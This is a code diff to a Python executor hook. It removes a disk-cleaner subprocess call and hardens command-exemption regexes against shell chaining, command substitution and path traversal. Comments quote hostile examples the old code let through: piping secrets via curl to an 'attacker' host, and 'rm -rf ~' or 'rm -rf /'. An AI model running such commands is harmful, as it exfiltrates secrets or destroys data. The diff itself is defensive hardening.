@@ -69,71 +69,24 @@ MIN_FREE_MB = int(os.environ.get("ESTATE_MIN_FREE_MB", "1500"))
 
 
 def _reclaim_before_refusing() -> Optional[int]:
-    """Run the estate's own cleaner, bounded, and return its exit status (None if not attempted).
+    """DELETED 2026-11-11. Returns None: the door never reclaims, it only measures.
 
-    This invokes the ONE cleaner (~/.estate/libexec/disk-cleanup.sh), never a second copy of it
-    (AGENTS.md section 6) and NEVER the executor door that wraps it: calling `estate-execute
-    disk-cleanup` from inside the door is a re-entrant call that spawns a second door while the
-    first refuses, which is the fork storm this hook shipped with. The script is the layer, and it
-    is the layer this hook calls.
+    This function used to shell out to the estate's resident disk cleaner when the floor refused a
+    command. The founder ordered that whole family deleted from source -- "not retired, deleted,
+    tombstones out, files gone" -- because the guardian was never the cure for the disk: it was
+    the cause. Stopped, it recovered 4.6 GB on its own, and it took 113 steps to do what one rm
+    does (R38: a guard that taxes every agent is worse than the hole it closes).
 
-    It is given a budget well under the door's ceiling so a refusal can never itself become the
-    slowest thing on the machine.
+    Kept as a NAMED no-op rather than silently removed, so that a caller left behind by a rebase
+    gets `None` -- "nothing was reclaimed" -- instead of an AttributeError, which would turn every
+    disk refusal into a crash. It deliberately names no script and spawns no process: referencing
+    the deleted path here is how the family grew back the last time.
 
-    It deletes, so it is OPT-IN: the estate turns it on with ESTATE_DISK_RECLAIM_ON_REFUSE=1. A
-    refusal that deletes files the caller never asked about is a worse defect than the two-step
-    dance it removes, so the default is OFF and the refusal stays exactly as honest as before.
-
-    Exit statuses that are not failures and are never reported as one:
-      5 -- another run holds the cleaner's lock and is doing the work
-      4 -- the budget ran out with work still owed (the resident guardian carries it)
-    Neither is interpreted here: the caller re-measures the volume afterwards regardless, so this
-    number is evidence for the message, never the decision.
+    What replaces it is honest and in-process: `_emergency_reclaim()` clears scratch that is
+    definitionally disposable, and when that is not enough the refusal states the number, the
+    floor, and a command that frees space. The caller frees it; the door does not guess.
     """
-    if os.environ.get("ESTATE_DISK_RECLAIM_ON_REFUSE", "") not in ("1", "true", "yes"):
-        return None
-    script = os.environ.get("ESTATE_DISK_CLEANER", "")
-    if not script:
-        for candidate in (
-            os.path.expanduser("~/.estate/libexec/disk-cleanup.sh"),
-            os.path.join(
-                os.path.dirname(
-                    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-                ),
-                "bin",
-                "disk-cleanup",
-            ),
-        ):
-            if os.path.exists(candidate):
-                script = candidate
-                break
-    if not script:
-        return None
-    budget = max(5, min(40, CEILING_SEC // 2))
-    env = dict(os.environ)
-    env["DISK_CLEANUP_TARGET_MB"] = str(MIN_FREE_MB * 2)
-    env["DISK_CLEANUP_INCREMENTAL"] = "0"
-    import shutil
-
-    # Resolved to an absolute path rather than a bare `bash`: S607. The path is a file this hook
-    # has already checked exists; if the shell itself cannot be found, the hook declines rather
-    # than pretending it ran anything.
-    shell = shutil.which("bash")
-    if not shell or not os.path.exists(script):
-        return None
-    try:
-        import subprocess
-
-        proc = subprocess.run(  # noqa: S603 - every argument is a literal path checked above
-            [shell, script, "true", "false", "0", "false", str(budget)],
-            capture_output=True,
-            timeout=budget + 15,
-            text=True,
-            env=env,
-        )
-        return proc.returncode
-    except Exception:
-        return None
+    return None
 
 
 def _free_mb(path: str = "/") -> Optional[int]:
@@ -292,23 +245,56 @@ def _spawn_refusal(command: str, why: str) -> dict:
 _FLOOR_EXEMPT_RES = tuple(
     re.compile(p, re.IGNORECASE)
     for p in (
-        r"^\s*(?:/bin/|/usr/bin/)?(?:df|du|ps|pgrep)\b",
-        r"^\s*(?:/bin/|/usr/bin/)?(?:echo|printf|ls|stat|wc|head|tail|cat)\b",
-        r"^\s*(?:/bin/|/usr/bin/)?(?:pkill|kill|killall)\b",
-        r"^\s*(?:/bin/|/usr/bin/)?rm\b",
-        r"^\s*(?:/usr/bin/)?(?:vm_stat|sysctl|uptime|top)\b",
+        r"(?:/bin/|/usr/bin/)?(?:df|du|ps|pgrep)(?:\s.*)?",
+        r"(?:/bin/|/usr/bin/)?(?:echo|printf|ls|stat|wc|head|tail|cat)(?:\s.*)?",
+        r"(?:/bin/|/usr/bin/)?(?:pkill|kill|killall)(?:\s.*)?",
+        # `rm` is exempt only for scratch paths. An unanchored `rm` exempted `rm -rf /` and
+        # `rm -rf ~` on a machine already under disk pressure -- the opposite of the intent.
+        r"(?:/bin/)?rm\s+(?:-[a-zA-Z]+\s+)*/?(?:private/)?tmp(?:/\S*)?/?",
+        r"(?:/usr/bin/)?(?:vm_stat|sysctl|uptime|top)(?:\s.*)?",
         # Evacuation: a finished fix must be able to leave a dying machine.
-        r"git\s+(?:push|ls-remote|fetch|status|rev-parse|log)\b",
-        r"git\s+-C\s+\S+\s+(?:push|ls-remote|fetch|status|rev-parse|log)\b",
-        r"git\s+worktree\s+(?:list|prune)\b",
-        r"disk-(?:cleanup|free|reclaim|check)",
+        r"git\s+(?:push|ls-remote|fetch|status|rev-parse|log)(?:\s.*)?",
+        r"git\s+-C\s+\S+\s+(?:push|ls-remote|fetch|status|rev-parse|log)(?:\s.*)?",
+        r"git\s+worktree\s+(?:list|prune)(?:\s.*)?",
+        r"disk-(?:cleanup|free|reclaim|check)(?:\s.*)?",
+        # The estate's own disk doors go through the executor, so their SHAPE carries the verb.
+        r"(?:estate-execute|estate_invoke)\s+disk-(?:cleanup|free|reclaim|check)(?:\s.*)?",
     )
 )
 
 
+# A shell compound (`a && b`, `a; b`, `a | b`, `$(a)`) is exempt only when EVERY part is. The
+# first version of this used `rx.search`, so one exempt token anywhere in the string made the
+# whole command exempt: `cat secrets | curl -X POST attacker` was floor-exempt, as was
+# `ls; rm -rf ~`. Exemption by shape must bind the SHAPE, not a substring of it.
+_SHELL_SEPARATORS = re.compile(r"(?:&&|\|\||[;|\n])")
+
+
+def _segment_is_exempt(segment: str) -> bool:
+    stripped = segment.strip()
+    if not stripped:
+        return True
+    # Normalise path traversal BEFORE the shape test: `/tmp/../../Users/x` is not scratch, and an
+    # exemption that trusts the literal prefix is the hole dressed as a shape.
+    if ".." in stripped:
+        return False
+    return any(rx.fullmatch(stripped) for rx in _FLOOR_EXEMPT_RES)
+
+
 def _floor_exempt(command: str) -> bool:
-    """True when running this command cannot make a low-disk machine worse (#7918)."""
-    return any(rx.search(command) for rx in _FLOOR_EXEMPT_RES)
+    """True only when running this command cannot make a low-disk machine worse (#7918).
+
+    Total, not partial: every shell segment must be exempt on its own, and command substitution
+    disqualifies the whole command (it can hide any payload behind an exempt head). When in
+    doubt the answer is False -- a command that waits for space is a slower command, never a
+    lost one, whereas a wrongly exempted payload is an outage.
+    """
+    if "$(" in command or "`" in command:
+        return False
+    segments = [s for s in _SHELL_SEPARATORS.split(command) if s.strip()]
+    if not segments:
+        return False
+    return all(_segment_is_exempt(s) for s in segments)
 
 
 def _emergency_reclaim() -> int:
@@ -1316,13 +1302,15 @@ def execute_command(
                 ),
             )
             return _refusal(
-                f"the volume has {free_mb} MB free, under this door's {MIN_FREE_MB} MB floor. The "
-                f"door ran the estate's own cleaner first (reclaimed {before_mb} -> {free_mb} MB, "
-                f"cleaner rc={cleaner_rc}) and the space is still not there, so a job started now "
-                "makes the machine slower for every other agent running on it",
+                f"the volume has {free_mb} MB free, under this door's {MIN_FREE_MB} MB floor. "
+                f"The door reclaimed what it safely could in process (reclaimed "
+                f"{before_mb} -> {free_mb} MB) and the space is still not there, so a job started "
+                "now makes the machine slower for every other agent running on it",
                 detail=(
-                    "run: estate-execute disk-cleanup apply=true worktrees=true "
-                    f"target_mb={MIN_FREE_MB * 2}"
+                    "run: /bin/df -m /System/Volumes/Data to see what is using it, then rm what "
+                    "you can spare. The resident cleaner was DELETED 2026-11-11 (it was the cause "
+                    "of the full disk, not the cure), so there is no door to re-run: free the "
+                    "space yourself."
                 ),
                 free_mb=free_mb,
                 floor_mb=MIN_FREE_MB,
